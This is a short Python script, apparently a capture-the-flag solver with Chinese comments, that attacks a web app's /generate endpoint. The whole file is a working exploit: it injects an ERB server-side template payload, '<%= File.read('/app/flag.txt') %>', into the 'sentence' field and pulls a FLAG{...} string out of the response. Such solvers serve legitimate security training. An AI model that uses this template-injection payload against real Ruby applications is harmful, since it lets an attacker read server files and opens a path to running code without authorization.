import re
import requests
import sys

'''
@文件命名：X-086-24
@使用方式: python X-086-24.py url
@简述思路: ERB 模板注入执行 File.read('/app/flag.txt') 并在响应中提取 flag。
'''


def Scan(url):
    r = requests.post(url + "/generate", data={"sentence": "<%= File.read('/app/flag.txt') %>", "number": "1"}, timeout=5)
    m = re.search(r"FLAG\{.*?\}", r.text, re.I)
    return m.group(0) if m else r.text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
